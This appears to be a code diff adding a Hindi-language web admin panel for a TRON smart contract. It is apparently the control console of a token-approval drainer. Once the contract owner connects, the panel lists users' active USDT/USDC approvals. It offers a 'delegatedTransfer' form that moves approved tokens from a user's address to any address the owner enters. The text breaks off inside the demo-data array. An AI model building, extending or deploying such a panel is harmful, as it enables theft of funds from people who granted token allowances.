@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>👑 एडमिन पैनल - Token Approval System</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+            color: #333;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            font-size: 36px;
+            color: #333;
+        }
+
+        .header h1 span {
+            color: #667eea;
+        }
+
+        .security-badge {
+            background: #dc3545;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 50px;
+            display: inline-block;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+
+        .wallet-section {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 30px;
+        }
+
+        .btn {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn-danger {
+            background: #dc3545;
+            color: white;
+        }
+
+        .btn-success {
+            background: #28a745;
+            color: white;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+
+        .table-container {
+            overflow-x: auto;
+            margin-top: 20px;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        th {
+            background: #f8f9fa;
+            padding: 15px;
+            text-align: left;
+            border-bottom: 2px solid #dee2e6;
+        }
+
+        td {
+            padding: 15px;
+            border-bottom: 1px solid #dee2e6;
+        }
+
+        .owner-only {
+            border: 2px solid #ffc107;
+            padding: 20px;
+            border-radius: 12px;
+            margin-top: 20px;
+        }
+
+        .warning {
+            background: #fff3cd;
+            color: #856404;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 5px 12px;
+            border-radius: 50px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .status-badge.active {
+            background: #cce5ff;
+            color: #004085;
+        }
+
+        .status-badge.used {
+            background: #f8d7da;
+            color: #721c24;
+        }
+
+        .filter-bar {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 25px;
+            flex-wrap: wrap;
+        }
+
+        .filter-bar input,
+        .filter-bar select {
+            padding: 10px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            min-width: 200px;
+            flex: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- हेडर -->
+        <div class="header">
+            <h1>👑 <span>एडमिन पैनल</span></h1>
+            <p>सिर्फ कॉन्ट्रैक्ट ओनर के लिए</p>
+        </div>
+
+        <!-- सिक्योरिटी बैज -->
+        <div class="security-badge">
+            🔒 प्राइवेट एडमिन पैनल - ओनर वेरिफिकेशन जरूरी
+        </div>
+
+        <!-- कॉन्ट्रैक्ट एड्रेस सेटिंग -->
+        <div class="warning">
+            <strong>⚠️ कॉन्ट्रैक्ट एड्रेस:</strong>
+            <input type="text" id="contractAddress" value="YOUR_CONTRACT_ADDRESS_HERE" 
+                   style="width: 100%; margin-top: 10px; padding: 8px;">
+            <button class="btn btn-success" style="margin-top: 10px;" onclick="updateContractAddress()">
+                ✅ एड्रेस सेट करें
+            </button>
+        </div>
+
+        <!-- वॉलेट कनेक्ट -->
+        <div class="wallet-section">
+            <button id="connectBtn" class="btn btn-primary" onclick="connectAdmin()">
+                🔌 एडमिन वॉलेट कनेक्ट करें
+            </button>
+            <div id="adminStatus" style="margin-top: 15px;"></div>
+        </div>
+
+        <!-- एडमिन पैनल (सिर्फ ओनर के लिए) -->
+        <div id="adminPanel" style="display: none;">
+            
+            <!-- स्टैट्स -->
+            <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin-bottom: 30px;">
+                <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 20px; border-radius: 12px; color: white;">
+                    <h3>कुल ट्रांजेक्शन</h3>
+                    <div style="font-size: 28px; font-weight: bold;" id="totalTx">0</div>
+                </div>
+                <div style="background: #28a745; padding: 20px; border-radius: 12px; color: white;">
+                    <h3>कुल यूजर्स</h3>
+                    <div style="font-size: 28px; font-weight: bold;" id="totalUsers">0</div>
+                </div>
+                <div style="background: #ffc107; padding: 20px; border-radius: 12px; color: #333;">
+                    <h3>कुल वॉल्यूम</h3>
+                    <div style="font-size: 28px; font-weight: bold;" id="totalVolume">0</div>
+                </div>
+                <div style="background: #17a2b8; padding: 20px; border-radius: 12px; color: white;">
+                    <h3>एक्टिव अप्रूवल</h3>
+                    <div style="font-size: 28px; font-weight: bold;" id="activeApprovals">0</div>
+                </div>
+            </div>
+
+            <!-- ट्रांसफर सेक्शन (सिर्फ ओनर) -->
+            <div class="owner-only">
+                <h3 style="color: #856404; margin-bottom: 20px;">🚀 टोकन ट्रांसफर (ओनर ओनली)</h3>
+                
+                <div class="form-group">
+                    <label>टोकन:</label>
+                    <select id="transferToken">
+                        <option value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t">USDT</option>
+                        <option value="TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8">USDC</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label>फ्रॉम (जिसने अप्रूव किया):</label>
+                    <input type="text" id="fromAddress" placeholder="TXYZ...">
+                </div>
+
+                <div class="form-group">
+                    <label>टू:</label>
+                    <input type="text" id="toAddress" placeholder="TXYZ...">
+                </div>
+
+                <div class="form-group">
+                    <label>अमाउंट (USDT):</label>
+                    <input type="number" id="transferAmount" placeholder="100">
+                </div>
+
+                <button class="btn btn-success" onclick="executeTransfer()" id="transferBtn">
+                    🚀 ट्रांसफर करें
+                </button>
+            </div>
+
+            <!-- अप्रूवल लिस्ट -->
+            <h3 style="margin: 30px 0 20px;">✅ हालिया अप्रूवल</h3>
+            
+            <div class="filter-bar">
+                <input type="text" id="approvalSearch" placeholder="🔍 यूजर सर्च...">
+                <select id="approvalFilter">
+                    <option value="all">सभी</option>
+                    <option value="active">एक्टिव</option>
+                    <option value="used">यूज्ड</option>
+                </select>
+                <button class="btn btn-primary" onclick="loadApprovals()">⟳ रिफ्रेश</button>
+            </div>
+
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>यूजर</th>
+                            <th>टोकन</th>
+                            <th>अमाउंट</th>
+                            <th>स्टेटस</th>
+                            <th>टाइम</th>
+                            <th>एक्शन</th>
+                        </tr>
+                    </thead>
+                    <tbody id="approvalsTable">
+                        <tr><td colspan="6" style="text-align: center;">⏳ डेटा लोड हो रहा है...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <!-- ट्रांजेक्शन हिस्ट्री -->
+            <h3 style="margin: 30px 0 20px;">📊 ट्रांजेक्शन हिस्ट्री</h3>
+            
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>टाइप</th>
+                            <th>फ्रॉम</th>
+                            <th>टू</th>
+                            <th>अमाउंट</th>
+                            <th>टाइम</th>
+                        </tr>
+                    </thead>
+                    <tbody id="transactionsTable">
+                        <tr><td colspan="5" style="text-align: center;">⏳ डेटा लोड हो रहा है...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- अनऑथराइज्ड मैसेज -->
+        <div id="unauthorizedMsg" style="display: none; text-align: center; padding: 50px;">
+            <h2 style="color: #dc3545;">⛔ अनऑथराइज्ड एक्सेस</h2>
+            <p>यह पैनल सिर्फ कॉन्ट्रैक्ट ओनर के लिए है।</p>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
+    <script>
+        // ============================================
+        // एडमिन पैनल - सिर्फ ओनर के लिए
+        // ============================================
+
+        let tronWeb = null;
+        let contract = null;
+        let adminAddress = null;
+        let contractOwner = null;
+        let contractAddress = "YOUR_CONTRACT_ADDRESS_HERE";
+
+        const NETWORK = "https://api.trongrid.io";
+
+        // कॉन्ट्रैक्ट ABI
+        const CONTRACT_ABI = [
+            {
+                "constant": false,
+                "inputs": [
+                    {"name": "tokenAddress", "type": "address"},
+                    {"name": "from", "type": "address"},
+                    {"name": "to", "type": "address"},
+                    {"name": "amount", "type": "uint256"}
+                ],
+                "name": "delegatedTransfer",
+                "outputs": [{"name": "", "type": "bool"}],
+                "type": "function"
+            },
+            {
+                "constant": true,
+                "inputs": [
+                    {"name": "tokenAddress", "type": "address"},
+                    {"name": "account", "type": "address"}
+                ],
+                "name": "balanceOfToken",
+                "outputs": [{"name": "", "type": "uint256"}],
+                "type": "function"
+            },
+            {
+                "constant": true,
+                "inputs": [],
+                "name": "owner",
+                "outputs": [{"name": "", "type": "address"}],
+                "type": "function"
+            }
+        ];
+
+        // ============================================
+        // कॉन्ट्रैक्ट एड्रेस अपडेट करें
+        // ============================================
+        window.updateContractAddress = function() {
+            const newAddress = document.getElementById('contractAddress').value.trim();
+            if (newAddress && newAddress.startsWith('T')) {
+                contractAddress = newAddress;
+                alert('✅ कॉन्ट्रैक्ट एड्रेस सेट हो गया');
+            }
+        };
+
+        // ============================================
+        // एडमिन कनेक्ट करें
+        // ============================================
+        window.connectAdmin = async function() {
+            if (contractAddress === "YOUR_CONTRACT_ADDRESS_HERE") {
+                alert('पहले कॉन्ट्रैक्ट एड्रेस डालें!');
+                return;
+            }
+
+            const connectBtn = document.getElementById('connectBtn');
+            connectBtn.disabled = true;
+            connectBtn.innerHTML = '⏳ वेरिफाई हो रहा है...';
+
+            try {
+                if (!window.tronLink) {
+                    alert('TronLink वॉलेट इंस्टॉल नहीं है!');
+                    return;
+                }
+
+                await window.tronLink.request({ method: 'tron_requestAccounts' });
+                
+                tronWeb = new TronWeb({
+                    fullHost: NETWORK,
+                    privateKey: window.tronLink.privateKey
+                });
+
+                adminAddress = tronWeb.defaultAddress.base58;
+                
+                // कॉन्ट्रैक्ट इनिशियलाइज करें
+                contract = await tronWeb.contract(CONTRACT_ABI, contractAddress);
+                contractOwner = await contract.owner().call();
+
+                // चेक करें कि एडमिन ओनर है या नहीं
+                if (adminAddress.toLowerCase() === contractOwner.toLowerCase()) {
+                    // ओनर है - एडमिन पैनल दिखाएं
+                    document.getElementById('adminPanel').style.display = 'block';
+                    document.getElementById('unauthorizedMsg').style.display = 'none';
+                    document.getElementById('adminStatus').innerHTML = `
+                        <div style="background: #d4edda; color: #155724; padding: 15px; border-radius: 8px;">
+                            ✅ ओनर वेरिफाइड! एडमिन पैनल एक्सेस ग्रांटेड
+                        </div>
+                    `;
+                    
+                    // डेमो डेटा लोड करें
+                    loadDemoData();
+                    
+                } else {
+                    // ओनर नहीं है - एक्सेस डिनाइड
+                    document.getElementById('adminPanel').style.display = 'none';
+                    document.getElementById('unauthorizedMsg').style.display = 'block';
+                    document.getElementById('adminStatus').innerHTML = `
+                        <div style="background: #f8d7da; color: #721c24; padding: 15px; border-radius: 8px;">
+                            ⛔ आप कॉन्ट्रैक्ट ओनर नहीं हैं! एक्सेस डिनाइड
+                        </div>
+                    `;
+                }
+
+            } catch (error) {
+                console.error(error);
+                alert('एरर: ' + error.message);
+            } finally {
+                connectBtn.disabled = false;
+                connectBtn.innerHTML = '🔌 एडमिन वॉलेट कनेक्ट करें';
+            }
+        };
+
+        // ============================================
+        // डेमो डेटा लोड करें
+        // ============================================
+        function loadDemoData() {
+            // स्टैट्स अपडेट करें
+            document.getElementById('totalTx').innerText = '156';
+            document.getElementById('totalUsers').innerText = '45';
+            document.getElementById('totalVolume').innerText = '125,000';
+            document.getElementById('activeApprovals').innerText = '23';
+
+            // अप्रूवल टेबल
+            const approvals = [
+                { user: 'TXYZ1234...', token: 'USDT', amount: '5,000', status: 'active', time: '2024-01-15 10:30' },
+               
